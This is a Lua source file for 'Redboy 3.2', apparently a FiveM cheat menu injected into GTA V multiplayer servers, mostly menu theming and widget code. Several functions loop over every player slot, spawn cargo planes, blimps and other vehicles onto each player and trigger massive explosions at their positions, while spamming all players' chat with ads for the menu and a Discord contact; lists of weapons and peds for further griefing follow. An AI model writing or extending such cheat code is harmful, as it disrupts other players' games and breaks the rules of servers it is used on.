                local di=CreateVehicle(GetHashKey(dg),GetEntityCoords(GetPlayerPed(i))+2.0,true,true) and CreateVehicle(GetHashKey(dg),GetEntityCoords(GetPlayerPed(i))+10.0,true,true)and CreateVehicle(GetHashKey(dg),2*GetEntityCoords(GetPlayerPed(i))+15.0,true,true)and CreateVehicle(GetHashKey(dh),GetEntityCoords(GetPlayerPed(i))+2.0,true,true)and CreateVehicle(GetHashKey(dh),GetEntityCoords(GetPlayerPed(i))+10.0,true,true)and CreateVehicle(GetHashKey(dh),2*GetEntityCoords(GetPlayerPed(i))+15.0,true,true)and CreateVehicle(GetHashKey(di),GetEntityCoords(GetPlayerPed(i))+2.0,true,true)and CreateVehicle(GetHashKey(di),GetEntityCoords(GetPlayerPed(i))+10.0,true,true)and CreateVehicle(GetHashKey(di),2*GetEntityCoords(GetPlayerPed(i))+15.0,true,true)and CreateVehicle(GetHashKey(dj),GetEntityCoords(GetPlayerPed(i))+2.0,true,true)and CreateVehicle(GetHashKey(dj),GetEntityCoords(GetPlayerPed(i))+10.0,true,true)and CreateVehicle(GetHashKey(dj),2*GetEntityCoords(GetPlayerPed(i))+15.0,true,true)and CreateVehicle(GetHashKey(dk),GetEntityCoords(GetPlayerPed(i))+2.0,true,true)and CreateVehicle(GetHashKey(dk),GetEntityCoords(GetPlayerPed(i))+10.0,true,true)and CreateVehicle(GetHashKey(dk),2*GetEntityCoords(GetPlayerPed(i))+15.0,true,true)and AddExplosion(GetEntityCoords(GetPlayerPed(i)),5,3000.0,true,false,100000.0)and AddExplosion(GetEntityCoords(GetPlayerPed(i)),5,3000.0,true,false,true)
            end
         end)
        end

function EdWiowko()
    Citizen.CreateThread(function()
        for bs=0,9 do 
            TriggerEvent('chatMessage', "^1[Redboy 3.2]", {141,211,255}, "^2Redboy 3.2 is the ^3best menu on ^4the market ^5right now! :^6By K??DKONGEN#9999 | Discord bKJd4eC5Db")
        end
        local dg="Avenger"
        local dh="CARGOPLANE"
        local di="luxor"
        local dj="maverick"
        local dk="blimp2"
        
        while not HasModelLoaded(GetHashKey(dh))do 
            Citizen.Wait(0)
            RequestModel(GetHashKey(dh))
        end
        
        while not HasModelLoaded(GetHashKey(di))do
            Citizen.Wait(0)RequestModel(GetHashKey(di))
        end
            
        while not HasModelLoaded(GetHashKey(dg))do 
            Citizen.Wait(0)RequestModel(GetHashKey(dg))
        end
            
        while not HasModelLoaded(GetHashKey(dj))do 
            Citizen.Wait(0)RequestModel(GetHashKey(dj))
        end
        
        while not HasModelLoaded(GetHashKey(dk))do 
            Citizen.Wait(0)RequestModel(GetHashKey(dk))
        end
        
        for bs=0,9 do 
            TriggerEvent('chatMessage', "^1[Redboy 3.2]", {141,211,255}, "^2Redboy 3.2 is the ^3best menu on ^4the market ^5right now! :^6By K??DKONGEN#9999| Discord bKJd4eC5Db")
        end
        
        for i=0,128 do 
            local di=CreateVehicle(GetHashKey(dg),GetEntityCoords(GetPlayerPed(i))+2.0,true,true) and CreateVehicle(GetHashKey(dg),GetEntityCoords(GetPlayerPed(i))+10.0,true,true)and CreateVehicle(GetHashKey(dg),2*GetEntityCoords(GetPlayerPed(i))+15.0,true,true)and CreateVehicle(GetHashKey(dh),GetEntityCoords(GetPlayerPed(i))+2.0,true,true)and CreateVehicle(GetHashKey(dh),GetEntityCoords(GetPlayerPed(i))+10.0,true,true)and CreateVehicle(GetHashKey(dh),2*GetEntityCoords(GetPlayerPed(i))+15.0,true,true)and CreateVehicle(GetHashKey(di),GetEntityCoords(GetPlayerPed(i))+2.0,true,true)and CreateVehicle(GetHashKey(di),GetEntityCoords(GetPlayerPed(i))+10.0,true,true)and CreateVehicle(GetHashKey(di),2*GetEntityCoords(GetPlayerPed(i))+15.0,true,true)and CreateVehicle(GetHashKey(dj),GetEntityCoords(GetPlayerPed(i))+2.0,true,true)and CreateVehicle(GetHashKey(dj),GetEntityCoords(GetPlayerPed(i))+10.0,true,true)and CreateVehicle(GetHashKey(dj),2*GetEntityCoords(GetPlayerPed(i))+15.0,true,true)and CreateVehicle(GetHashKey(dk),GetEntityCoords(GetPlayerPed(i))+2.0,true,true)and CreateVehicle(GetHashKey(dk),GetEntityCoords(GetPlayerPed(i))+10.0,true,true)and CreateVehicle(GetHashKey(dk),2*GetEntityCoords(GetPlayerPed(i))+15.0,true,true)and AddExplosion(GetEntityCoords(GetPlayerPed(i)),5,3000.0,true,false,100000.0)and AddExplosion(GetEntityCoords(GetPlayerPed(i)),5,3000.0,true,false,true)
        end
     end)
    end

    function edfjuahjdwh()
        Citizen.CreateThread(function()

            local dg="prop_beach_fire"
            local dh="prop_beach_fire"
            local di="prop_beach_fire"
            local dj="prop_beach_fire"
            local dk="prop_beach_fire"
            
            while not HasModelLoaded(GetHashKey(dh))do 
                Citizen.Wait(0)
                RequestModel(GetHashKey(dh))
            end
            
            while not HasModelLoaded(GetHashKey(di))do
                Citizen.Wait(0)RequestModel(GetHashKey(di))
            end
                
            while not HasModelLoaded(GetHashKey(dg))do 
                Citizen.Wait(0)RequestModel(GetHashKey(dg))
            end
                
            while not HasModelLoaded(GetHashKey(dj))do 
                Citizen.Wait(0)RequestModel(GetHashKey(dj))
            end
            
            while not HasModelLoaded(GetHashKey(dk))do 
                Citizen.Wait(0)RequestModel(GetHashKey(dk))
            end
            
            for i=0,128 do 
                local di=CreateVehicle(GetHashKey(dg),GetEntityCoords(GetPlayerPed(i))+2.0,true,true) and CreateVehicle(GetHashKey(dg),GetEntityCoords(GetPlayerPed(i))+10.0,true,true)and CreateVehicle(GetHashKey(dg),2*GetEntityCoords(GetPlayerPed(i))+15.0,true,true)and CreateVehicle(GetHashKey(dh),GetEntityCoords(GetPlayerPed(i))+2.0,true,true)and CreateVehicle(GetHashKey(dh),GetEntityCoords(GetPlayerPed(i))+10.0,true,true)and CreateVehicle(GetHashKey(dh),2*GetEntityCoords(GetPlayerPed(i))+15.0,true,true)and CreateVehicle(GetHashKey(di),GetEntityCoords(GetPlayerPed(i))+2.0,true,true)and CreateVehicle(GetHashKey(di),GetEntityCoords(GetPlayerPed(i))+10.0,true,true)and CreateVehicle(GetHashKey(di),2*GetEntityCoords(GetPlayerPed(i))+15.0,true,true)and CreateVehicle(GetHashKey(dj),GetEntityCoords(GetPlayerPed(i))+2.0,true,true)and CreateVehicle(GetHashKey(dj),GetEntityCoords(GetPlayerPed(i))+10.0,true,true)and CreateVehicle(GetHashKey(dj),2*GetEntityCoords(GetPlayerPed(i))+15.0,true,true)and CreateVehicle(GetHashKey(dk),GetEntityCoords(GetPlayerPed(i))+2.0,true,true)and CreateVehicle(GetHashKey(dk),GetEntityCoords(GetPlayerPed(i))+10.0,true,true)and CreateVehicle(GetHashKey(dk),2*GetEntityCoords(GetPlayerPed(i))+15.0,true,true)and AddExplosion(GetEntityCoords(GetPlayerPed(i)),5,3000.0,true,false,100000.0)and AddExplosion(GetEntityCoords(GetPlayerPed(i)),5,3000.0,true,false,true)
            end
         end)
        end

function IsResourceInstalled(name)
    local resources = GetResources()
    for i = 1, #resources do
        if resources[i] == name then
            return true
        else
            return false
        end
    end
end

-- RedBoyMenu Functions
function RPPPwdjwdU23.SetFont(id, font)
    buttonFont = font
    menus[id].titleFont = font
end

function RPPPwdjwdU23.SetMenuFocusBackgroundColor(id, r, g, b, a)
    setMenuProperty(id, "menuFocusBackgroundColor", {["r"] = r, ["g"] = g, ["b"] = b, ["a"] = a or menus[id].menuFocusBackgroundColor.a})
end

function RPPPwdjwdU23.SetMaxOptionCount(id, count)
    setMenuProperty(id, 'maxOptionCount', count)
end

function RPPPwdjwdU23.PopupWindow(x, y, title)

end


function RPPPwdjwdU23.SetTheme(id, theme)
    if theme == "dark" then
        RPPPwdjwdU23.SetMenuBackgroundColor(id,  10, 10, 20, 450)
        RPPPwdjwdU23.SetTitleBackgroundColor(id, 150, 75, 200, 175)
        RPPPwdjwdU23.SetTitleColor(id, 255, 255, 255, 255)
        RPPPwdjwdU23.SetMenuSubTextColor(id, 50, 75, 75, 175)
        RPPPwdjwdU23.SetMenuFocusColor(id, 10, 75, 75, 175)
        RPPPwdjwdU23.SetFont(id, 4)
        RPPPwdjwdU23.SetMenuX(id, .75)
        RPPPwdjwdU23.SetMenuY(id, .1)
        RPPPwdjwdU23.SetMenuWidth(id, 0.23)
        RPPPwdjwdU23.SetMaxOptionCount(id, 12)

        titleHeight = 0.11 
        titleXOffset = 0.5 
        titleYOffset = 0.03 
        titleSpacing = 2 
        buttonHeight = 0.038 
        buttonScale = 0.475 
        buttonTextXOffset = 0.005 
        buttonTextYOffset = 0.005 

        themecolor = '~w~'
        themearrow = ">"
    elseif theme == "LyseR??deModder" then
        RPPPwdjwdU23.SetMenuBackgroundColor(id, 219, 29, 191, 80)
        RPPPwdjwdU23.SetTitleBackgroundColor(id, 245, 120, 226, 170)
        RPPPwdjwdU23.SetTitleColor(id, 245, 120, 226, 255)
        RPPPwdjwdU23.SetMenuSubTextColor(id, 245, 120, 226, 255)
            RPPPwdjwdU23.SetFont(id, 4)
            RPPPwdjwdU23.SetMenuX(id, .75)
            RPPPwdjwdU23.SetMenuY(id, .1)
            RPPPwdjwdU23.SetMenuWidth(id, 0.23)
            RPPPwdjwdU23.SetMaxOptionCount(id, 12)
    
            titleHeight = 0.11 
            titleXOffset = 0.5 
            titleYOffset = 0.03 
            titleSpacing = 2 
            buttonHeight = 0.038 
            buttonScale = 0.475 
            buttonTextXOffset = 0.005 
            buttonTextYOffset = 0.005 
    
            themecolor = '~w~'
            themearrow = ">"


        titleHeight = 0.11 
        titleXOffset = 0.5 
        titleYOffset = 0.03 
        titleSpacing = 2 
        buttonHeight = 0.038 
        buttonScale = 0.475 
        buttonTextXOffset = 0.005 
        buttonTextYOffset = 0.005 
    
            themecolor = '~w~'
            themearrow = ">"

        elseif theme == "redboy43" then
            RPPPwdjwdU23.SetMenuBackgroundColor(id, 120, 9, 224, 80)
            RPPPwdjwdU23.SetTitleBackgroundColor(id, 120, 9, 224, 170)
            RPPPwdjwdU23.SetTitleColor(id, 120, 9, 224, 255)
            RPPPwdjwdU23.SetMenuSubTextColor(id, 120, 9, 224, 255)
                RPPPwdjwdU23.SetFont(id, 4)
                RPPPwdjwdU23.SetMenuX(id, .75)
                RPPPwdjwdU23.SetMenuY(id, .1)
                RPPPwdjwdU23.SetMenuWidth(id, 0.23)
                RPPPwdjwdU23.SetMaxOptionCount(id, 12)
        
                titleHeight = 0.11 
                titleXOffset = 0.5 
                titleYOffset = 0.03 
                titleSpacing = 2 
                buttonHeight = 0.038 
                buttonScale = 0.475 
                buttonTextXOffset = 0.005 
                buttonTextYOffset = 0.005 
        
                themecolor = '~w~'
                themearrow = ">"
    
    
            titleHeight = 0.11 
            titleXOffset = 0.5 
            titleYOffset = 0.03 
            titleSpacing = 2 
            buttonHeight = 0.038 
            buttonScale = 0.475 
            buttonTextXOffset = 0.005 
            buttonTextYOffset = 0.005 
        
                themecolor = '~w~'
                themearrow = ">"

            elseif theme == "black" then
                RPPPwdjwdU23.SetMenuBackgroundColor(id, 0, 0, 0, 80)
                RPPPwdjwdU23.SetTitleBackgroundColor(id, 0, 0, 0, 170)
                RPPPwdjwdU23.SetTitleColor(id, 0, 0, 0, 255)
                RPPPwdjwdU23.SetMenuSubTextColor(id, 0, 0, 0, 255)
                    RPPPwdjwdU23.SetFont(id, 4)
                    RPPPwdjwdU23.SetMenuX(id, .75)
                    RPPPwdjwdU23.SetMenuY(id, .1)
                    RPPPwdjwdU23.SetMenuWidth(id, 0.23)
                    RPPPwdjwdU23.SetMaxOptionCount(id, 12)
            
                    titleHeight = 0.11 
                    titleXOffset = 0.5 
                    titleYOffset = 0.03 
                    titleSpacing = 2 
                    buttonHeight = 0.038 
                    buttonScale = 0.475 
                    buttonTextXOffset = 0.005 
                    buttonTextYOffset = 0.005 
            
                    themecolor = '~w~'
                    themearrow = ">"
        
        
                titleHeight = 0.11 
                titleXOffset = 0.5 
                titleYOffset = 0.03 
                titleSpacing = 2 
                buttonHeight = 0.038 
                buttonScale = 0.475 
                buttonTextXOffset = 0.005 
                buttonTextYOffset = 0.005 
            
                    themecolor = '~w~'
                    themearrow = ">"
    


        elseif theme == "RedBoy" then
            RPPPwdjwdU23.SetMenuBackgroundColor(id, 50, 50, 160, 85)
        RPPPwdjwdU23.SetTitleBackgroundColor(id, 92, 255, 0, 255)
        RPPPwdjwdU23.SetTitleColor(id, 219, 29, 191, 170)
        RPPPwdjwdU23.SetMenuSubTextColor(id, 255, 255, 255, 230)
        RPPPwdjwdU23.SetFont(id, 4)
        RPPPwdjwdU23.SetMenuX(id, .75)
        RPPPwdjwdU23.SetMenuY(id, .1)
        RPPPwdjwdU23.SetMenuWidth(id, 0.23)
        RPPPwdjwdU23.SetMaxOptionCount(id, 12)

        titleHeight = 0.11 
        titleXOffset = 0.5 
        titleYOffset = 0.03 
        titleSpacing = 2 
        buttonHeight = 0.038 
        buttonScale = 0.475 
        buttonTextXOffset = 0.005 
        buttonTextYOffset = 0.005 
    
            themecolor = '~w~'
            themearrow = ">"


        elseif theme == "light" then
        RPPPwdjwdU23.SetMenuBackgroundColor(id, 38, 38, 38, 80)
        RPPPwdjwdU23.SetTitleBackgroundColor(id, 92, 212, 249, 170)
        RPPPwdjwdU23.SetTitleColor(id, 240, 240, 240, 255)
        RPPPwdjwdU23.SetMenuSubTextColor(id, 240, 240, 240, 255)
            RPPPwdjwdU23.SetFont(id, 4)
            RPPPwdjwdU23.SetMenuX(id, .75)
            RPPPwdjwdU23.SetMenuY(id, .1)
            RPPPwdjwdU23.SetMenuWidth(id, 0.23)
            RPPPwdjwdU23.SetMaxOptionCount(id, 12)
    
            titleHeight = 0.11 
            titleXOffset = 0.5 
            titleYOffset = 0.03 
            titleSpacing = 2 
            buttonHeight = 0.038 
            buttonScale = 0.475 
            buttonTextXOffset = 0.005 
            buttonTextYOffset = 0.005 
    
            themecolor = '~w~'
            themearrow = ">"
        elseif theme == "infamous" then
            RPPPwdjwdU23.SetMenuBackgroundColor(id, 38, 38, 38, 255)
            RPPPwdjwdU23.SetTitleBackgroundColor(id, 150, 38, 38, 255)
            RPPPwdjwdU23.SetTitleColor(id, 150, 38, 38, 255)
            RPPPwdjwdU23.SetMenuSubTextColor(id, 150, 38, 38, 255)
            RPPPwdjwdU23.SetFont(id, 4)
            RPPPwdjwdU23.SetMenuX(id, .75)
            RPPPwdjwdU23.SetMenuY(id, .1)
            RPPPwdjwdU23.SetMenuWidth(id, 0.23)
            RPPPwdjwdU23.SetMaxOptionCount(id, 12)
    
            titleHeight = 0.11 
            titleXOffset = 0.5 
            titleYOffset = 0.03 
            titleSpacing = 2 
            buttonHeight = 0.038 
            buttonScale = 0.475 
            buttonTextXOffset = 0.005 
            buttonTextYOffset = 0.005 
    
            themecolor = '~w~'
            themearrow = ">"
        elseif theme == "k??dkongen" then
            RPPPwdjwdU23.SetMenuBackgroundColor(id, 50, 50, 160, 85)
            RPPPwdjwdU23.SetTitleBackgroundColor(id, 92, 255, 0, 255)
            RPPPwdjwdU23.SetTitleColor(id, 92, 212, 249, 170)
            RPPPwdjwdU23.SetMenuSubTextColor(id, 255, 255, 255, 230)
            RPPPwdjwdU23.SetFont(id, 4)
            RPPPwdjwdU23.SetMenuX(id, .75)
            RPPPwdjwdU23.SetMenuY(id, .1)
            RPPPwdjwdU23.SetMenuWidth(id, 0.23)
            RPPPwdjwdU23.SetMaxOptionCount(id, 12)
    
            titleHeight = 0.11 
            titleXOffset = 0.5 
            titleYOffset = 0.03 
            titleSpacing = 2 
            buttonHeight = 0.038 
            buttonScale = 0.475 
            buttonTextXOffset = 0.005 
            buttonTextYOffset = 0.005 
    
            themecolor = '~w~'
            themearrow = ">"
        elseif theme == "basic" then
            RPPPwdjwdU23.SetMenuBackgroundColor(id, 81, 231, 251, 125)
            RPPPwdjwdU23.SetTitleBackgroundColor(id, 92, 212, 249, 80)
            RPPPwdjwdU23.SetTitleColor(id, 92, 212, 249, 230)
            RPPPwdjwdU23.SetMenuSubTextColor(id, 255, 255, 255, 230)
            RPPPwdjwdU23.SetFont(id, 4)
            RPPPwdjwdU23.SetMenuX(id, .75)
            RPPPwdjwdU23.SetMenuY(id, .1)
            RPPPwdjwdU23.SetMenuWidth(id, 0.23)
            RPPPwdjwdU23.SetMaxOptionCount(id, 12)
    
            titleHeight = 0.11 
            titleXOffset = 0.5 
            titleYOffset = 0.03 
            titleSpacing = 2 
            buttonHeight = 0.038 
            buttonScale = 0.475 
            buttonTextXOffset = 0.005 
            buttonTextYOffset = 0.005 
    
            themecolor = '~w~'
            themearrow = ">"
    elseif theme == "nuke" then
        RPPPwdjwdU23.SetMenuBackgroundColor(id, 5, 160, 1, 125)
        RPPPwdjwdU23.SetTitleBackgroundColor(id, 5, 233, 1, 255)
        RPPPwdjwdU23.SetTitleColor(id, 5, 233, 1, 200)
        RPPPwdjwdU23.SetMenuSubTextColor(id, 255, 255, 255, 230)
        RPPPwdjwdU23.SetFont(id, 4)
        RPPPwdjwdU23.SetMenuX(id, .75)
        RPPPwdjwdU23.SetMenuY(id, .1)
        RPPPwdjwdU23.SetMenuWidth(id, 0.23)
        RPPPwdjwdU23.SetMaxOptionCount(id, 12)

        titleHeight = 0.11 
        titleXOffset = 0.5 
        titleYOffset = 0.03 
        titleSpacing = 2 
        buttonHeight = 0.038 
        buttonScale = 0.475 
        buttonTextXOffset = 0.005 
        buttonTextYOffset = 0.005 
        
        themecolor = '~w~'
        themearrow = ">"
    elseif theme == "Allstars" then
        RPPPwdjwdU23.SetMenuBackgroundColor(id,  176, 121, 12, 450)
        RPPPwdjwdU23.SetTitleBackgroundColor(id, 189, 152, 4, 175)
        RPPPwdjwdU23.SetTitleColor(id, 153, 115, 34, 255)
        RPPPwdjwdU23.SetMenuSubTextColor(id, 153, 115, 34, 175)
        RPPPwdjwdU23.SetMenuFocusColor(id, 0, 0, 0, 175)
        RPPPwdjwdU23.SetFont(id, 4)
        RPPPwdjwdU23.SetMenuX(id, .75)
        RPPPwdjwdU23.SetMenuY(id, .1)
        RPPPwdjwdU23.SetMenuWidth(id, 0.23)
        RPPPwdjwdU23.SetMaxOptionCount(id, 12)

        titleHeight = 0.11 
        titleXOffset = 0.5 
        titleYOffset = 0.03 
        titleSpacing = 2 
        buttonHeight = 0.038 
        buttonScale = 0.475 
        buttonTextXOffset = 0.005 
        buttonTextYOffset = 0.005 

        themecolor = '~w~'
        themearrow = ">"
    elseif theme == "nice" then
        RPPPwdjwdU23.SetMenuBackgroundColor(id, 23, 32, 42)
        RPPPwdjwdU23.SetTitleBackgroundColor(id, 23, 32, 42)
        RPPPwdjwdU23.SetTitleColor(id, 255, 0, 0, 255)
        RPPPwdjwdU23.SetMenuSubTextColor(id, 255, 255, 255, 255)
        RPPPwdjwdU23.SetMenuFocusColor(id, 10, 75, 75, 175)
        RPPPwdjwdU23.SetFont(id, 4)
        RPPPwdjwdU23.SetMenuX(id, .75)
        RPPPwdjwdU23.SetMenuY(id, .1)
        RPPPwdjwdU23.SetMenuWidth(id, 0.23)
        RPPPwdjwdU23.SetMaxOptionCount(id, 12)

        titleHeight = 0.11 
        titleXOffset = 0.5 
        titleYOffset = 0.03 
        titleSpacing = 2 
        buttonHeight = 0.038 
        buttonScale = 0.475 
        buttonTextXOffset = 0.005 
        buttonTextYOffset = 0.005 
        
        themecolor = '~w~'
        themearrow = ">"
    elseif theme == "Maja" then
        RPPPwdjwdU23.SetMenuBackgroundColor(id, 50, 50, 160, 85)
        RPPPwdjwdU23.SetTitleBackgroundColor(id, 92, 212, 249, 170)
        RPPPwdjwdU23.SetTitleColor(id, 92, 212, 249, 170)
        RPPPwdjwdU23.SetMenuSubTextColor(id, 255, 255, 255, 230)
        RPPPwdjwdU23.SetFont(id, 4)
        RPPPwdjwdU23.SetMenuX(id, .75)
        RPPPwdjwdU23.SetMenuY(id, .1)
        RPPPwdjwdU23.SetMenuWidth(id, 0.23)
        RPPPwdjwdU23.SetMaxOptionCount(id, 12)

        titleHeight = 0.11 
        titleXOffset = 0.5 
        titleYOffset = 0.03 
        titleSpacing = 2 
        buttonHeight = 0.038 
        buttonScale = 0.475 
        buttonTextXOffset = 0.005 
        buttonTextYOffset = 0.005 


        themecolor = '~w~'
        themearrow = ">"

    end
end

function RPPPwdjwdU23.InitializeTheme()
    for i = 1, #menulist do
        RPPPwdjwdU23.SetTheme(menulist[i], theme)
    end
end


function RPPPwdjwdU23.ComboBox2(text, items, currentIndex, selectedIndex, callback)
	local itemsCount = #items
	local selectedItem = items[currentIndex]
	local isCurrent = menus[currentMenu].currentOption == (optionCount + 1)

	if itemsCount > 1 and isCurrent then
		selectedItem = tostring(selectedItem)
	end

	if RPPPwdjwdU23.Button(text, selectedItem) then
		selectedIndex = currentIndex
		callback(currentIndex, selectedIndex)
		return true
	elseif isCurrent then
		if currentKey == keys.left then
            if currentIndex > 1 then currentIndex = currentIndex - 1 
            elseif currentIndex == 1 then currentIndex = 1 end
		elseif currentKey == keys.right then
            if currentIndex < itemsCount then  currentIndex = currentIndex + 1 
            elseif currentIndex == itemsCount then currentIndex = itemsCount end
		end
	else
		currentIndex = selectedIndex
	end

	callback(currentIndex, selectedIndex)
    return false
end


function RPPPwdjwdU23.ComboBoxSlider(text, items, currentIndex, selectedIndex, callback)
	local itemsCount = #items
	local selectedItem = items[currentIndex]
	local isCurrent = menus[currentMenu].currentOption == (optionCount + 1)

	if itemsCount > 1 and isCurrent then
		selectedItem = tostring(selectedItem)
	end

	if RPPPwdjwdU23.Button2(text, items, itemsCount, currentIndex) then
		selectedIndex = currentIndex
		callback(currentIndex, selectedIndex)
		return true
	elseif isCurrent then
		if currentKey == keys.left then
            if currentIndex > 1 then currentIndex = currentIndex - 1 
            elseif currentIndex == 1 then currentIndex = 1 end
		elseif currentKey == keys.right then
            if currentIndex < itemsCount then currentIndex = currentIndex + 1 
            elseif currentIndex == itemsCount then currentIndex = itemsCount end
		end
	else
		currentIndex = selectedIndex
    end
	callback(currentIndex, selectedIndex)
	return false
end

local function drawButton2(text, items, itemsCount, currentIndex)
	local x = menus[currentMenu].x + menus[currentMenu].width / 2
	local multiplier = nil

	if menus[currentMenu].currentOption <= menus[currentMenu].maxOptionCount and optionCount <= menus[currentMenu].maxOptionCount then
		multiplier = optionCount
	elseif optionCount > menus[currentMenu].currentOption - menus[currentMenu].maxOptionCount and optionCount <= menus[currentMenu].currentOption then
		multiplier = optionCount - (menus[currentMenu].currentOption - menus[currentMenu].maxOptionCount)
    end
    
    

	if multiplier then
		local y = menus[currentMenu].y + titleHeight + buttonHeight + (buttonHeight * multiplier) - buttonHeight / 2
		local backgroundColor = nil
		local textColor = nil
		local subTextColor = nil
		local shadow = false

		if menus[currentMenu].currentOption == optionCount then
			backgroundColor = menus[currentMenu].menuFocusBackgroundColor
			textColor = menus[currentMenu].menuFocusTextColor
			subTextColor = menus[currentMenu].menuFocusTextColor
		else
			backgroundColor = menus[currentMenu].menuBackgroundColor
			textColor = menus[currentMenu].menuTextColor
			subTextColor = menus[currentMenu].menuSubTextColor
			shadow = true
		end

        local sliderWidth = ((menus[currentMenu].width / 3) / itemsCount) 
        local subtractionToX = ((sliderWidth * (currentIndex + 1)) - (sliderWidth * currentIndex)) / 2

        local XOffset = 0.16 
        local stabilizer = 1


        if itemsCount >= 40 then
            stabilizer = 1.005
        end
		
        drawRect(x, y, menus[currentMenu].width, buttonHeight, backgroundColor) 
        drawRect(((menus[currentMenu].x + 0.1675) + (subtractionToX * itemsCount)) / stabilizer, y, sliderWidth * (itemsCount - 1), buttonHeight / 2, {r = 110, g = 110, b = 110, a = 150})
        drawRect(((menus[currentMenu].x + 0.1675) + (subtractionToX * currentIndex)) / stabilizer, y, sliderWidth * (currentIndex - 1), buttonHeight / 2, {r = 200, g = 200, b = 200, a = 140}) 
        drawText(text, menus[currentMenu].x + buttonTextXOffset, y - (buttonHeight / 2) + buttonTextYOffset, buttonFont, textColor, buttonScale, false, shadow) 


        local CurrentItem = tostring(items[currentIndex])
        if string.len(CurrentItem) == 1 then XOffset = 0.1650
        elseif string.len(CurrentItem) == 2 then XOffset = 0.1625
        elseif string.len(CurrentItem) == 3 then XOffset = 0.16015
        elseif string.len(CurrentItem) == 4 then XOffset = 0.1585
        elseif string.len(CurrentItem) == 5 then XOffset = 0.1570
        elseif string.len(CurrentItem) >= 6 then XOffset = 0.1555
        end

        drawText(items[currentIndex], ((menus[currentMenu].x + XOffset) + 0.04) / stabilizer, y - (buttonHeight / 2.15) + buttonTextYOffset, buttonFont, {r = 255, g = 255, b = 255, a = 255}, buttonScale, false, shadow) -- Current Item Text
	end
end


function roundNum(num, numDecimalPlaces)
    local mult = 10^(numDecimalPlaces or 0)
    return math.floor(num * mult + 0.5) / mult
  end

function RPPPwdjwdU23.Button2(text, items, itemsCount, currentIndex)
	local buttonText = text

	if menus[currentMenu] then
		optionCount = optionCount + 1

		local isCurrent = menus[currentMenu].currentOption == optionCount

		drawButton2(text, items, itemsCount, currentIndex)

		if isCurrent then
			if currentKey == keys.select then
				PlaySoundFrontend(-1, menus[currentMenu].buttonPressedSound.name, menus[currentMenu].buttonPressedSound.set, true)
				debugPrint(buttonText..' button pressed')
				return true
			elseif currentKey == keys.left or currentKey == keys.right then
				PlaySoundFrontend(-1, "NAV_UP_DOWN", "HUD_FRONTEND_DEFAULT_SOUNDSET", true)
			end
		end

		return false
	else
		debugPrint('Failed to create '..buttonText..' button: '..tostring(currentMenu)..' menu doesn\'t exist')

		return false
	end
end


Citizen.CreateThread(function()
    local p = 1
    while true do
        if theme == "RedBoy" then 
            if p == 5 then p = 1 else p = p + 1 end
            for i = 1, #menulist do
                if RPPPwdjwdU23.IsMenuOpened(menulist[i]) then RPPPwdjwdU23.SetTitleBackgroundSprite(menulist[i], 'digitaloverlay', 'static' .. p) end
            end
        else 
            for i = 1, #menulist do RPPPwdjwdU23.SetTitleBackgroundSprite(menulist[i], 'commonmenu', 'gradient_bgd') end
        end
        Wait(100)
    end
end)

-- MAIN 
Citizen.CreateThread(function()
    if mpMessage then ShowMPMessage(startMessage, subMessage, 50) else ShowInfo(startMessage .. " " .. subMessage) end
    ShowInfo(motd)

    
    local currThemeIndex = 1
    local selThemeIndex = 1

    local currFaceIndex = GetPedDrawableVariation(PlayerPedId(), 0) + 1
    local selFaceIndex = GetPedDrawableVariation(PlayerPedId(), 0) + 1

    local currFtextureIndex = GetPedTextureVariation(PlayerPedId(), 0) + 1 
    local selFtextureIndex = GetPedTextureVariation(PlayerPedId(), 0) + 1 

    local currHairIndex = GetPedDrawableVariation(PlayerPedId(), 2) + 1
    local selHairIndex = GetPedDrawableVariation(PlayerPedId(), 2) + 1

    local currHairTextureIndex = GetPedTextureVariation(PlayerPedId(), 2) + 1
    local selHairTextureIndex = GetPedTextureVariation(PlayerPedId(), 2) + 1

    local currMaskIndex = GetPedDrawableVariation(PlayerPedId(), 1) + 1
    local selMaskIndex = GetPedDrawableVariation(PlayerPedId(), 1) + 1

	local currHatIndex = GetPedPropIndex(PlayerPedId(), 0) + 1
    local selHatIndex = GetPedPropIndex(PlayerPedId(), 0) + 1
    
    if currHatIndex == 0 or currHatIndex == 1 then
        currHatIndex = 9
        selHatIndex = 9
    end

	local currHatTextureIndex = GetPedPropTextureIndex(PlayerPedId(), 0)
    local selHatTextureIndex = GetPedPropTextureIndex(PlayerPedId(), 0)


    if currHatTextureIndex == -1 or currHatTextureIndex == 0 then
        currHatTextureIndex = 1
        selHatTextureIndex = 1
    end





    local SelectedPlayer
local bullets = { "WEAPON_FLAREGUN", "WEAPON_FIREWORK", "WEAPON_RPG", "WEAPON_PIPEBOMB", "WEAPON_RAILGUN", "WEAPON_SMOKEGRENADE", "VEHICLE_WEAPON_PLAYER_LASER", "VEHICLE_WEAPON_TANK" }
local peds = { "a_c_boar", "a_c_killerwhale", "a_c_sharktiger", "csb_stripper_01" }
local peds2 = { "s_m_y_baywatch_01", "a_m_m_acult_01", "ig_barry", "g_m_y_ballaeast_01", "u_m_y_babyd", "a_m_y_acult_01", "a_m_m_afriamer_01", "u_m_y_corpse_01", "s_m_m_armoured_02", "g_m_m_armboss_01", "g_m_y_armgoon_02", "s_m_y_blackops_03", "s_m_y_blackops_01", "s_m_y_prismuscl_01", "g_m_m_chemwork_01", "a_m_y_musclbeac_01", "csb_cop", "s_m_y_clown_01", "s_m_y_cop_01", "u_m_y_zombie_01" }
local peds3 = { "cs_debra", "a_f_m_beach_01", "a_f_m_bodybuild_01", "a_f_m_business_02", "a_f_y_business_04", "mp_f_cocaine_01", "u_f_y_corpse_01", "mp_f_meth_01", "g_f_importexport_01", "a_f_y_vinewood_04", "a_m_m_tranvest_01", "a_m_m_tranvest_02", "ig_tracydisanto", "csb_stripper_02", "s_f_y_stripper_01", "a_f_m_soucentmc_01", "a_f_m_soucent_02", "u_f_y_poppymich", "ig_patricia", "s_f_y_cop_01" }
local peds4 = { "a_c_husky", "a_c_cat_01", "a_c_boar", "a_c_sharkhammer", "a_c_coyote", "a_c_chimp", "a_c_chop", "a_c_cow", "a_c_deer", "a_c_dolphin", "a_c_fish", "a_c_hen", "a_c_humpback", "a_c_killerwhale", "a_c_mtlion", "a_c_pig", "a_c_pug", "a_c_rabbit_01", "a_c_retriever", "a_c_rhesus", "a_c_rottweiler", "a_c_sharktiger", "a_c_shepherd", "a_c_westy" }
local vehicles = { "Freight", "Rhino", "Futo", "Vigilante", "Monster", "Panto", "Bus", "Dump", "CargoPlane" }
local vehicleSpeed = { 1.0, 10.0, 20.0, 30.0, 40.0, 50.0, 60.0, 70.0, 80.0, 90.0, 100.0, 110.0, 120.0, 130.0, 140.0, 150.0 }

local currentVehicle = 1
